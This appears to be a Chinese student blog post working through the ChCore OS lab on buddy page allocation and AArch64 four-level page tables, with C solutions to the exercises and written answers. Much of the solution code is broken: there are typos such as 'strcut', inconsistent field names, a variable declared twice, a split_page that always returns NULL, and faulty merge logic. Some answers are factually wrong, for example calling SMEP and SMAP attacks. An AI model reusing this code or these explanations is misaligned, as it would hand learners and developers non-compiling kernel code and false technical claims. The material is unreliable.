chunk);</span><br><span class="line">    order = chunk-&gt;order;</span><br><span class="line">    <span class="comment">/* 通过伙伴块的地址关系计算得到伙伴块的地址</span></span><br><span class="line"><span class="comment">     * 由于伙伴块的阶数相同，所以伙伴块地址之间仅有一位差别，仅需做一次异或操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> BUDDY_PAGE_SIZE_ORDER (12)</span></span><br><span class="line">    buddy_chunk_addr = chunk_addr ^</span><br><span class="line">        (<span class="number">1UL</span> &lt;&lt; (order + BUDDY_PAGE_SIZE_ORDER));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查伙伴块的地址是否属于该内存池</span></span><br><span class="line">    <span class="keyword">if</span> ((buddy_chunk_addr &lt; pool-&gt;pool_start_addr) ||</span><br><span class="line">        (buddy_chunk_addr &gt;= (pool-&gt;pool_start_addr +</span><br><span class="line">                    pool-&gt;pool_mem_size))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> virt_to_page(pool, (<span class="type">void</span> *)buddy_chunk_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习 1"></a>练习 1</h3><p><strong>实 现kernel&#x2F;mm&#x2F;buddy.c中 的 四 个 函 数：buddy_get_pages()，split_page()，buddy_free_pages()，merge_page()。请参考伙伴块索引等功能的辅助函数:get_buddy_chunk()。</strong><br>从伙伴系统获取块的大致流程：</p>
<ul>
<li>找到能够满足连续分配 order 的连续页块</li>
<li>进行分配</li>
<li>分割 list node<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * buddy_get_pages: get free page from buddy system.</span></span><br><span class="line"><span class="comment"> * pool @ physical memory structure reserved in the kernel</span></span><br><span class="line"><span class="comment"> * order @ get the (1&lt;&lt;order) continous pages from the buddy system </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> page *<span class="title function_">buddy_get_pages</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, u64 order)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// &lt;lab2&gt;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> current_order = order;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (current_order &lt; BUDDY_MAX_ORDER &amp;&amp; pool-&gt;freelists[current_order].nr_free &lt;= <span class="number">0</span>)</span><br><span class="line">        current_order++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current_order &gt;= BUDDY_MAX_ORDER)&#123;</span><br><span class="line">        kwarn(<span class="string">&quot;Try to allocate a buddy chunk greater than BUDDY_MAX_ORDER\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> list_entry(pool-&gt;freelists[current_order].free_list.next, <span class="keyword">struct</span> page, node);</span><br><span class="line">    <span class="keyword">if</span> (page == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        kdebug(<span class="string">&quot;buddy get a NULL page\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    split_page(pool, order, page);</span><br><span class="line">    page-&gt;allocated = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">    <span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
从伙伴系统分割 list node 的大致流程</li>
<li>提取要切割的页</li>
<li>递归分割，直到满足大小</li>
<li>相关 free_list 的数目要削减<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">page_append</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, strcut page *page)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_list</span> *<span class="title">free_list</span> =</span> &amp;pool-&gt;free_lists[page-&gt;order];</span><br><span class="line">    list_add(&amp;page-&gt;node, &amp;free_list-&gt;free_list);</span><br><span class="line">    free_list-&gt;nr_free++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">page_del</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, strcut page *page)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_list</span> *<span class="title">free_list</span> =</span> &amp;pool-&gt;free_lists[page-&gt;order];</span><br><span class="line">    list_del(&amp;page-&gt;node);</span><br><span class="line">    free_list-&gt;nr_free--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * split_page: split the memory block into two smaller sub-block, whose order</span></span><br><span class="line"><span class="comment"> * is half of the origin page.</span></span><br><span class="line"><span class="comment"> * pool @ physical memory structure reserved in the kernel</span></span><br><span class="line"><span class="comment"> * order @ order for origin page block</span></span><br><span class="line"><span class="comment"> * page @ splitted page</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *<span class="title function_">split_page</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, u64 order,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// &lt;lab2&gt;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">split_page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;allocated == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        kwarn(<span class="string">&quot;Try to split an allocated page\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page-&gt;allocated = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    page_del(pool, page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (page-&gt;order &gt; order)</span><br><span class="line">    &#123;</span><br><span class="line">        page-&gt;order--;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span>* <span class="title">buddy_page</span> =</span> get_buddy_chunk(pool, page);</span><br><span class="line">        <span class="keyword">if</span> (buddy_page != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            buddy_page-&gt;allocated = <span class="number">0</span>;</span><br><span class="line">            buddy_page-&gt;order = page-&gt;order;</span><br><span class="line">            page_append(pool, buddy_page);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> split_page;</span><br><span class="line">    <span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
从伙伴系统合并 list node 的大概流程</li>
<li>提取要合并的块</li>
<li>查找伙伴块</li>
<li>递归合并</li>
<li>修改 nr_free<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * merge_page: merge the given page with the buddy page</span></span><br><span class="line"><span class="comment"> * pool @ physical memory structure reserved in the kernel</span></span><br><span class="line"><span class="comment"> * page @ merged page (attempted)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *<span class="title function_">merge_page</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// &lt;lab2&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">merge_page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;allocated == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        kwarn(<span class="string">&quot;Try to merge an allocated page\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page_del(pool, page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (page-&gt;order &lt; BUDDY_MAX_ORDER)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span>* <span class="title">buddy_page</span> =</span> get_buddy_chunk(pool, page);</span><br><span class="line">        <span class="keyword">if</span> (buddy_page == <span class="literal">NULL</span> || buddy_page-&gt;allocated || buddy_page-&gt;order != page-&gt;order)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (page &gt; buddy_page)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span>* <span class="title">tmp</span> =</span> buddy_page;</span><br><span class="line">            buddy_page = page;</span><br><span class="line">            page = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        buddy_page-&gt;allocated = <span class="number">1</span>;</span><br><span class="line">        page_del(pool, page);</span><br><span class="line">        page-&gt;order++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page_append(pool, page);</span><br><span class="line">    merge_page = page;</span><br><span class="line">	<span class="keyword">return</span> merge_page;</span><br><span class="line">	<span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
从释放块到伙伴系统的大致流程：</li>
<li>判断是否在使用</li>
<li>释放并合并<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * buddy_free_pages: give back the pages to buddy system</span></span><br><span class="line"><span class="comment"> * pool @ physical memory structure reserved in the kernel</span></span><br><span class="line"><span class="comment"> * page @ free page structure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">buddy_free_pages</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// &lt;lab2&gt;</span></span><br><span class="line">    <span class="keyword">if</span> (!page-&gt;allocated)&#123;</span><br><span class="line">        kwarn(<span class="string">&quot;Try to free a free page\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page-&gt;allocated = <span class="number">0</span>;</span><br><span class="line">    page_append(pool, page);</span><br><span class="line"></span><br><span class="line">    merge_page(pool, page);</span><br><span class="line">	<span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="虚拟内存映射"><a href="#虚拟内存映射" class="headerlink" title="虚拟内存映射"></a>虚拟内存映射</h1><h2 id="AArch64-地址翻译与地址空间分离"><a href="#AArch64-地址翻译与地址空间分离" class="headerlink" title="AArch64 地址翻译与地址空间分离"></a>AArch64 地址翻译与地址空间分离</h2><p>程序中的数据或指令的虚拟地址，无法直接被处理器使用，通过 MMU 内存管理单元进行翻译，MMU 一般通过遍历内存中的页表，将程序中的虚拟地址翻译为物理地址</p>
<p>不同进程间，以及进程态和用户态之间拥有不同的页表，操作系统在进行上下文切换时也会切换对应的页表项</p>
<p>AArch64 使用两个页表基地址寄存器，用来分离进程态和内核态的页表，其翻译范围由 TCR_ELx 配置，一般而言（以 48 位为例）</p>
<ul>
<li>TTBR0_ELx 存储用户态页表基址 转换范围 0x0000000000000000 ~ 0x0000FFFFFFFFFFFF</li>
<li>TTBR1_ELx 存储内核态页表基址 转换范围 0xFFFF000000000000 ~ 0xFFFFFFFFFFFFFFFF</li>
</ul>
<p><strong>问题 2</strong></p>
<blockquote>
<p>AArch64 采用了两个页表基地址寄存器，相较于 x86-64 架构中只有一个页表基地址寄存器，这样的好处是什么？请从性能与安全两个角度做简要的回答。</p>
</blockquote>
<p>从性能来看，对进程态和内核态设置不同的页表，一方面在进行系统调用时无需进行页表的切换，也避免 TLB 刷新的开销</p>
<p>x86_64 仅提供一个页表基址寄存器 CR3 内核不使用单独页表，因此选择直接映射到应用程序的高地址部分，也避免了系统调用中造成的页表切换</p>
<p>从安全性来看，双页表能够使内核态与进程态之间的数据指令无法进行交互，能够防止 SMEP SMAP 等攻击</p>
<h2 id="虚拟地址翻译与组成"><a href="#虚拟地址翻译与组成" class="headerlink" title="虚拟地址翻译与组成"></a>虚拟地址翻译与组成</h2><p>ChCore 采用四级页表结构<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205311559912.png"></p>
<p>MMU 使用 48 位进行页表的遍历</p>
<ul>
<li>[47:39] 0级页表索引号，1个0级页表项对应 512 G，其内容指向1级页表</li>
<li>[38:30] 1级页表索引号，每个1级页表项对应 1 G范围，其内容指向2级页表</li>
<li>[29:21] 2级页表索引号，每个2级页表项对应 2 M范围，其内容指向3级页表</li>
<li>[20:12] 3级页表索引号，每个3级页表项对应 4k 范围，即一页，其内容为页帧号</li>
<li>[11:0]  页偏移，与页帧号结合能得到真实物理地址</li>
</ul>
<p>页表项使用描述符进行表示，分为三种：</p>
<ul>
<li>表描述符：意味着下一级为页表，包含页表地址及属性</li>
<li>块描述符：包含下一项页表地址或者页帧号及相应的属性</li>
<li>页描述符：表示下一级为页，包含页帧号及属性</li>
</ul>
<p>其条目结构如下：<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205311616954.png"><br>对应源码进行理解</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        u64 is_valid:<span class="number">1</span>, is_table:<span class="number">1</span>, ignored1:<span class="number">10</span>, next_table_addr:<span class="number">36</span>, reserved:<span class="number">4</span>, ignored2:<span class="number">7</span>, PXNTable:<span class="number">1</span>,	<span class="comment">// Privileged Execute-never for next level</span></span><br><span class="line">            XNTable:<span class="number">1</span>,	<span class="comment">// Execute-never for next level</span></span><br><span class="line">            APTable:<span class="number">2</span>,	<span class="comment">// Access permissions for next level</span></span><br><span class="line">            NSTable:<span class="number">1</span>;</span><br><span class="line">    &#125; table;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        u64 is_valid:<span class="number">1</span>, is_table:<span class="number">1</span>, attr_index:<span class="number">3</span>,	<span class="comment">// Memory attributes index</span></span><br><span class="line">            NS:<span class="number">1</span>,		<span class="comment">// Non-secure</span></span><br><span class="line">            AP:<span class="number">2</span>,		<span class="comment">// Data access permissions</span></span><br><span class="line">            SH:<span class="number">2</span>,		<span class="comment">// Shareability</span></span><br><span class="line">            AF:<span class="number">1</span>,		<span class="comment">// Accesss flag</span></span><br><span class="line">            nG:<span class="number">1</span>,		<span class="comment">// Not global bit</span></span><br><span class="line">            reserved1:<span class="number">4</span>, nT:<span class="number">1</span>, reserved2:<span class="number">13</span>, pfn:<span class="number">18</span>, reserved3:<span class="number">2</span>, GP:<span class="number">1</span>, reserved4:<span class="number">1</span>, DBM:<span class="number">1</span>,	<span class="comment">// Dirty bit modifier</span></span><br><span class="line">            Contiguous:<span class="number">1</span>, PXN:<span class="number">1</span>,	<span class="comment">// Privileged execute-never</span></span><br><span class="line">            UXN:<span class="number">1</span>,		<span class="comment">// Execute never</span></span><br><span class="line">            soft_reserved:<span class="number">4</span>, PBHA:<span class="number">4</span>;	<span class="comment">// Page based hardware attributes</span></span><br><span class="line">    &#125; l1_block;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        u64 is_valid:<span class="number">1</span>, is_table:<span class="number">1</span>, attr_index:<span class="number">3</span>,	<span class="comment">// Memory attributes index</span></span><br><span class="line">            NS:<span class="number">1</span>,		<span class="comment">// Non-secure</span></span><br><span class="line">            AP:<span class="number">2</span>,		<span class="comment">// Data access permissions</span></span><br><span class="line">            SH:<span class="number">2</span>,		<span class="comment">// Shareability</span></span><br><span class="line">            AF:<span class="number">1</span>,		<span class="comment">// Accesss flag</span></span><br><span class="line">            nG:<span class="number">1</span>,		<span class="comment">// Not global bit</span></span><br><span class="line">            reserved1:<span class="number">4</span>, nT:<span class="number">1</span>, reserved2:<span class="number">4</span>, pfn:<span class="number">27</span>, reserved3:<span class="number">2</span>, GP:<span class="number">1</span>, reserved4:<span class="number">1</span>, DBM:<span class="number">1</span>,	<span class="comment">// Dirty bit modifier</span></span><br><span class="line">            Contiguous:<span class="number">1</span>, PXN:<span class="number">1</span>,	<span class="comment">// Privileged execute-never</span></span><br><span class="line">            UXN:<span class="number">1</span>,		<span class="comment">// Execute never</span></span><br><span class="line">            soft_reserved:<span class="number">4</span>, PBHA:<span class="number">4</span>;	<span class="comment">// Page based hardware attributes</span></span><br><span class="line">    &#125; l2_block;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        u64 is_valid:<span class="number">1</span>, is_page:<span class="number">1</span>, attr_index:<span class="number">3</span>,	<span class="comment">// Memory attributes index</span></span><br><span class="line">            NS:<span class="number">1</span>,		<span class="comment">// Non-secure</span></span><br><span class="line">            AP:<span class="number">2</span>,		<span class="comment">// Data access permissions</span></span><br><span class="line">            SH:<span class="number">2</span>,		<span class="comment">// Shareability</span></span><br><span class="line">            AF:<span class="number">1</span>,		<span class="comment">// Accesss flag</span></span><br><span class="line">            nG:<span class="number">1</span>,		<span class="comment">// Not global bit</span></span><br><span class="line">            pfn:<span class="number">36</span>, reserved:<span class="number">3</span>, DBM:<span class="number">1</span>,	<span class="comment">// Dirty bit modifier</span></span><br><span class="line">            Contiguous:<span class="number">1</span>, PXN:<span class="number">1</span>,	<span class="comment">// Privileged execute-never</span></span><br><span class="line">            UXN:<span class="number">1</span>,		<span class="comment">// Execute never</span></span><br><span class="line">            soft_reserved:<span class="number">4</span>, PBHA:<span class="number">4</span>,	<span class="comment">// Page based hardware attributes</span></span><br><span class="line">            ignored:<span class="number">1</span>;</span><br><span class="line">    &#125; l3_page;</span><br><span class="line">    u64 pte;</span><br><span class="line">&#125; <span class="type">pte_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* page_table_page type */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="type">pte_t</span> ent[PTP_ENTRIES];</span><br><span class="line">&#125; <span class="type">ptp_t</span>;</span><br></pre></td></tr></table></figure>

<p><strong>问题 3</strong></p>
<blockquote>
<ol>
<li>请问在页表条目中填写的下一级页表的地址是物理地址还是虚拟地址?</li>
<li>在 ChCore 中检索当前页表条目的时候，使用的页表基地址是虚拟地址还是物理地址？</li>
</ol>
</blockquote>
<p>在页表条目中填写的地址均是物理地址，但是页表基地址是虚拟地址</p>
<p>有时需要通过物理地址进行读取和修改内存，内核和用户态程序都需要虚拟内存转换，ChCore从虚拟地址 0xFFFFFF00_00000000 开始线性映射物理内存，可以理解基于页表的虚拟内存机制是为了保证进程的隔离性与内存的利用率，而内核态页表的使用是为了安全访问</p>
<p><strong>问题 4</strong></p>
<blockquote>
<ol>
<li>如果我们有 4G 物理内存，管理内存需要多少空间开销? 这个开销是如何降低的?</li>
<li>总结一下 x86-64 和 AArch64 地址翻译机制的区别，AArch64 MMU架构设计的优点是什么?</li>
</ol>
</blockquote>
<p>4G 物理内存</p>
<ul>
<li>如果一级页表，每页 4 K，共有 10^6 页，每个条目 8 字节，需要 8 M</li>
<li>如果是多级页表，3级页表 2M，2级页表 1G，1级页表 512G，需要 4 + 4*512 ～ 2000 &#x3D; 16K</li>
</ul>
<p>AArch64 地址翻译使用内核进程双页表</p>
<h2 id="页表管理"><a href="#页表管理" class="headerlink" title="页表管理"></a>页表管理</h2><p>实验实现页表管理机制，包括四级页表插入和删除虚拟到物理的映射，以及需要时创建页表页<br><strong>练习 2</strong></p>
<blockquote>
<p>在文件kernel&#x2F;mm&#x2F;page_table中，实现map_range_in_pgtbl()，unmap_range_in_pgtbl()和query_in_pgtbl() 。可以调用辅助函数：set_pte_flags(),get_next_ptp(),flush_tlb()。</p>
</blockquote>
<p>首先对辅助函数进行分析</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * the 3rd arg means the kind of PTE.</span><br><span class="line"> */</span><br><span class="line"> // 根据类型和标识位设置 页的属性</span><br><span class="line">static int set_pte_flags(pte_t * entry, vmr_prop_t flags, int kind)</span><br><span class="line">&#123;</span><br><span class="line">    if (flags &amp; VMR_WRITE)</span><br><span class="line">        entry-&gt;l3_page.AP = AARCH64_PTE_AP_HIGH_RW_EL0_RW;</span><br><span class="line">    else</span><br><span class="line">        entry-&gt;l3_page.AP = AARCH64_PTE_AP_HIGH_RO_EL0_RO;</span><br><span class="line"></span><br><span class="line">    if (flags &amp; VMR_EXEC)</span><br><span class="line">        entry-&gt;l3_page.UXN = AARCH64_PTE_UX;</span><br><span class="line">    else</span><br><span class="line">        entry-&gt;l3_page.UXN = AARCH64_PTE_UXN;</span><br><span class="line"></span><br><span class="line">    // EL1 cannot directly execute EL0 accessiable region.</span><br><span class="line">    if (kind == USER_PTE)</span><br><span class="line">        entry-&gt;l3_page.PXN = AARCH64_PTE_PXN;</span><br><span class="line">    entry-&gt;l3_page.AF = AARCH64_PTE_AF_ACCESSED;</span><br><span class="line"></span><br><span class="line">    // inner sharable</span><br><span class="line">    entry-&gt;l3_page.SH = INNER_SHAREABLE;</span><br><span class="line">    // memory type</span><br><span class="line">    entry-&gt;l3_page.attr_index = NORMAL_MEMORY;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Find next page table page for the &quot;va&quot;.</span><br><span class="line"> */ 为虚拟地址 va 查找下一级页白页，给定当前页表及层级，返回下一级页表，如果缺失则进行分配</span><br><span class="line">static int get_next_ptp(ptp_t * cur_ptp, u32 level, vaddr_t va,</span><br><span class="line">			ptp_t ** next_ptp, pte_t ** pte, bool alloc)</span><br><span class="line">&#123;</span><br><span class="line">    u32 index = 0;</span><br><span class="line">    pte_t *entry;</span><br><span class="line"></span><br><span class="line">    if (cur_ptp == NULL)</span><br><span class="line">        return -ENOMAPPING;</span><br><span class="line">    // 根据层级获取 va 在该层级的索引号</span><br><span class="line">    switch (level) &#123;</span><br><span class="line">    case 0:</span><br><span class="line">        index = GET_L0_INDEX(va);</span><br><span class="line">        break;</span><br><span class="line">    case 1:</span><br><span class="line">        index = GET_L1_INDEX(va);</span><br><span class="line">        break;</span><br><span class="line">    case 2:</span><br><span class="line">        index = GET_L2_INDEX(va);</span><br><span class="line">        break;</span><br><span class="line">    case 3:</span><br><span class="line">        index = GET_L3_INDEX(va);</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        BUG_ON(1);</span><br><span class="line">    &#125;</span><br><span class="line">    // 获取入口项的地址</span><br><span class="line">    entry = &amp;(cur_ptp-&gt;ent[index]);</span><br><span class="line">    if (IS_PTE_INVALID(entry-&gt;pte)) &#123;</span><br><span class="line">        if (alloc == false) &#123;</span><br><span class="line">            return -ENOMAPPING;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            /* alloc a new page table page */</span><br><span class="line">            ptp_t *new_ptp;</span><br><span class="line">            paddr_t new_ptp_paddr;</span><br><span class="line">            pte_t new_pte_val;</span><br><span class="line">            // 分配单个物理页作为新的页表页</span><br><span class="line">            new_ptp = get_pages(0);</span><br><span class="line">            BUG_ON(new_ptp == NULL);</span><br><span class="line">            memset((void *)new_ptp, 0, PAGE_SIZE);</span><br><span class="line">            // 获取物理地址并设置属性为页表 table</span><br><span class="line">            new_ptp_paddr = virt_to_phys((vaddr_t) new_ptp);</span><br><span class="line"></span><br><span class="line">            new_pte_val.pte = 0;</span><br><span class="line">            new_pte_val.table.is_valid = 1;</span><br><span class="line">            new_pte_val.table.is_table = 1;</span><br><span class="line">            new_pte_val.table.next_table_addr</span><br><span class="line">                = new_ptp_paddr &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">            /* same effect as: cur_ptp-&gt;ent[index] = new_pte_val; */</span><br><span class="line">            entry-&gt;pte = new_pte_val.pte;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 转换为虚拟地址</span><br><span class="line">    *next_ptp = (ptp_t *) GET_NEXT_PTP(entry);</span><br><span class="line">    *pte = entry;</span><br><span class="line">    if (IS_PTE_TABLE(entry-&gt;pte))</span><br><span class="line">        return NORMAL_PTP;</span><br><span class="line">    else</span><br><span class="line">        return BLOCK_PTP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先在获得页表的基础上，实现 query_in_pgtbl()，完成虚拟地址到物理地址的转换，并返回相关页表入口</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Translate a va to pa, and get its pte for the flags</span><br><span class="line"> */</span><br><span class="line">/*</span><br><span class="line"> * query_in_pgtbl: translate virtual address to physical </span><br><span class="line"> * address and return the corresponding page table entry</span><br><span class="line"> * </span><br><span class="line"> * pgtbl @ ptr for the first level page table(pgd) virtual address</span><br><span class="line"> * va @ query virtual address</span><br><span class="line"> * pa @ return physical address</span><br><span class="line"> * entry @ return page table entry</span><br><span class="line"> * </span><br><span class="line"> * Hint: check the return value of get_next_ptp, if ret == BLOCK_PTP</span><br><span class="line"> * return the pa and block entry immediately</span><br><span class="line"> */</span><br><span class="line">int query_in_pgtbl(vaddr_t * pgtbl, vaddr_t va, paddr_t * pa, pte_t ** entry)</span><br><span class="line">&#123;</span><br><span class="line">	// &lt;lab2&gt;</span><br><span class="line">    ptp_t * cur_ptp = (ptp_t *) pgtbl;</span><br><span class="line">	ptp_t *next_ptp = NULL;</span><br><span class="line">	pte_t *next_pte = NULL;</span><br><span class="line"></span><br><span class="line">	int level = 0;</span><br><span class="line">	int err = 0;</span><br><span class="line">	while (level &lt;= 3 &amp;&amp; (err = get_next_ptp(cur_ptp, level, va, &amp;next_ptp, &amp;next_pte, false)) == NORMAL_PTP)</span><br><span class="line">	&#123;</span><br><span class="line">		cur_ptp = next_ptp;</span><br><span class="line">		level++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (err == NORMAL_PTP)</span><br><span class="line">	&#123;</span><br><span class="line">		if (level != 4)&#123;</span><br><span class="line">			kwarn(&quot;query_in_pgtbl: level = %d &lt; 4\n&quot;, level);</span><br><span class="line">			return -ENOMAPPING;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (!next_pte-&gt;l3_page.is_valid || !next_pte-&gt;l3_page.is_page)&#123;</span><br><span class="line">			return -ENOMAPPING;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		*pa = virt_to_phys((vaddr_t)next_ptp) + GET_VA_OFFSET_L3(va);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else if(err &lt; 0)&#123;</span><br><span class="line">		return err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else &#123;</span><br><span class="line">		kwarn(&quot;query_in_pgtbl: show never be here\n&quot;);</span><br><span class="line">		return err;</span><br><span class="line">	&#125;</span><br><span class="line">	// &lt;/lab2&gt;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来是映射与取消映射操作，对于映射来说，就是将物理页面与虚拟页面对应起来，新建页表可以借助 get_next_ptp 的 alloc 实现，以创建多级页表项，最后一级页项参考 alloc 实现并设置参数，对于取消映射而言，直接解除映射关系，直接将 pte 清零即可</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * map_range_in_pgtbl: map the virtual address [va:va+size] to </span><br><span class="line"> * physical address[pa:pa+size] in given pgtbl</span><br><span class="line"> *</span><br><span class="line"> * pgtbl @ ptr for the first level page table(pgd) virtual address</span><br><span class="line"> * va @ start virtual address</span><br><span class="line"> * pa @ start physical address</span><br><span class="line"> * len @ mapping size</span><br><span class="line"> * flags @ corresponding attribution bit</span><br><span class="line"> *</span><br><span class="line"> * Hint: In this function you should first invoke the get_next_ptp()</span><br><span class="line"> * to get the each level page table entries. Read type pte_t carefully</span><br><span class="line"> * and it is convenient for you to call set_pte_flags to set the page</span><br><span class="line"> * permission bit. Don&#x27;t forget to call flush_tlb at the end of this function </span><br><span class="line"> */</span><br><span class="line">int map_range_in_pgtbl(vaddr_t * pgtbl, vaddr_t va, paddr_t pa,</span><br><span class="line">		       size_t len, vmr_prop_t flags)</span><br><span class="line">&#123;</span><br><span class="line">	// &lt;lab2&gt;</span><br><span class="line">	for (const vaddr_t end_va = va + len; va &lt; end_va; va+= PAGE_SIZE)</span><br><span class="line">	&#123;</span><br><span class="line">		ptp_t * cur_ptp = (ptp_t *) pgtbl;</span><br><span class="line">		ptp_t * next_ptp = NULL;</span><br><span class="line">		pte_t * next_pte = NULL;</span><br><span class="line">		int level = 0;</span><br><span class="line">		int err = 0;</span><br><span 